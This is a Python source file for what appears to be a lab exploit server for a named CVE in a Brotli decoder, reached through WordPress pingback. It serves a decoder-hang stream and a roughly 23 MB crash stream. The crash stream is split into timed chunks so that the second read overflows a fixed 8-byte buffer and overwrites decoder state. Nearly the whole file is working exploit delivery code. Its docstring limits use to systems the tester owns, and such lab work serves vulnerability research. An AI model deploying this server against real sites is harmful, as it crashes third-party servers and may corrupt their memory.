#!/usr/bin/env python3
"""Payload server for the CVE-2026-111497 WordPress pingback lab.

Endpoints
---------
GET /health          JSON status and payload sizes
GET /small.br       86-byte non-progressing decoder loop
GET /hang.br        alias of /small.br
GET /payload.br     ~23 MB OOB-write crash stream, delivered in two chunks
GET /crash.br       alias of /payload.br
GET /               plain HTML landing page

The crash stream is sent as an HTTP/1.1 chunked response:

    chunk 1: 23,068,693 bytes (stream + 3 padding bytes)
    delay:   CHUNK_DELAY seconds (default 1.0)
    chunk 2: 127-byte tail

The delay is what makes the bug reliable over HTTP.  libcurl feeds each
network read to BrotliDecoderDecompressStream().  After chunk 1 the decoder
has a one-byte partial buffer (`buffer_length == 1`).  When chunk 2 arrives
in a separate read, the vulnerable decoder copies it into the fixed 8-byte
inline buffer without a bounds check and overwrites `pos`/`max_distance`.

Do not expose this server to the public Internet except through a tunnel you
control, and only while testing a system you own.
"""

from __future__ import annotations

import json
import os
import socket
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

from payload import build_crash_payload, build_hang_payload

PORT = int(os.environ.get("PORT", "8080"))
CHUNK_DELAY = float(os.environ.get("CHUNK_DELAY", "1.0"))
PAYLOAD_DIR = os.environ.get("PAYLOAD_DIR", "/payloads")

HANG = build_hang_payload()
CRASH = build_crash_payload()
CRASH_SPLIT = len(CRASH) - 127

print(
    f"[payload] hang={len(HANG)}B crash={len(CRASH)}B "
    f"split={CRASH_SPLIT} delay={CHUNK_DELAY}s",
    flush=True,
)

os.makedirs(PAYLOAD_DIR, exist_ok=True)
for name, blob in (("hang.br", HANG), ("crash.br", CRASH)):
    path = os.path.join(PAYLOAD_DIR, name)
    if not os.path.exists(path) or os.path.getsize(path) != len(blob):
        with open(path, "wb") as handle:
            handle.write(blob)
        print(f"[payload] wrote {path}", flush=True)


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "brotli-pingback-lab/1.0"

    def _headers(self, status: int, **extra: str) -> None:
        self.send_response(status)
        self.send_header("Server", self.server_version)
        self.send_header("Cache-Control", "no-store, no-transform, max-age=0")
        self.send_header("X-Lab", "brotli-pingback-lab")
        for key, value in extra.items():
            self.send_header(key, value)
        self.end_headers()

    def do_HEAD(self) -> None:  # noqa: N802
        path = urlparse(self.path).path
        if path == "/health":
            self._json_head()
            return
        if path in ("/small.br", "/hang.br"):
            self._headers(200, **self._br_headers(len(HANG)))
            return
        if path in ("/payload.br", "/crash.br", "/payload"):
            # A HEAD cannot express the chunked body; report the total size.
            self._headers(200, **self._br_headers(len(CRASH)))
            return
        self._headers(404, **{"Content-Type": "text/plain; charset=utf-8"})

    def do_GET(self) -> None:  # noqa: N802
        path = urlparse(self.path).path

        if path == "/health":
            body = json.dumps(
                {
                    "status": "ok",
                    "hang_bytes": len(HANG),
                    "crash_bytes": len(CRASH),
                    "crash_split": CRASH_SPLIT,
                    "chunk_delay_seconds": CHUNK_DELAY,
                }
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store, no-transform")
            self.end_headers()
            self.wfile.write(body)
            return

        if path in ("/small.br", "/hang.br"):
            self._send_small()
            return

        if path in ("/payload.br", "/crash.br", "/payload"):
            self._send_crash()
            return

        body = (
            b"<!doctype html><html><head><title>brotli pingback lab</title></head>"
            b"<body><h1>brotli pingback lab</h1>"
            b"<p>Payload server for CVE-2026-111497.</p>"
            b"<ul><li><a href=\"/small.br\">/small.br</a> (86 B hang)</li>"
            b"<li><a href=\"/payload.br\">/payload.br</a> (crash)</li>"
            b"<li><a href=\"/health\">/health</a></li></ul>"
            b"</body></html>"
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store, no-transform")
        self.end_headers()
        self.wfile.write(body)

    def _br_headers(self, length: int) -> dict[str, str]:
        return {
            "Content-Type": "application/octet-stream",
            "Content-Encoding": "br",
            "Content-Length": str(length),
            "Connection": "close",
        }

    def _json_head(self) -> None:
        body = json.dumps({"status": "ok"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()

    def _send_small(self) -> None:
        self._headers(200, **self._br_headers(len(HANG)))
        self.wfile.write(HANG)
        self.wfile.flush()

    def _send_crash(self) -> None:
        first = CRASH[:CRASH_SPLIT]
        tail = CRASH[CRASH_SPLIT:]
        self.send_response(200)
        self.send_header("Server", self.server_version)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Encoding", "br")
        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Cache-Control", "no-store, no-transform, max-age=0")
        self.send_header("X-Lab", "brotli-pingback-lab")
        self.end_headers()

        try:
            self.wfile.write(b"%x\r\n" % len(first))
            self.wfile.write(first)
            self.wfile.write(b"\r\n")
            self.wfile.flush()

            # Force a decoder-call boundary with buffer_length == 1.
            time.sleep(CHUNK_DELAY)

            self.wfile.write(b"%x\r\n" % len(tail))
            self.wfile.write(tail)
            self.wfile.write(b"\r\n")
            self.wfile.write(b"0\r\n\r\n")
            self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError, socket.timeout):
            # Expected when the decoder crashes the HTTP client.
            pass

    def log_message(self, fmt: str, *args) -> None:
        client = self.address_string()
        print(f"[http] {client} {fmt % args}", flush=True)


class Server(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def main() -> None:
    server = Server(("0.0.0.0", PORT), Handler)
    print(f"[http] listening on 0.0.0.0:{PORT}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
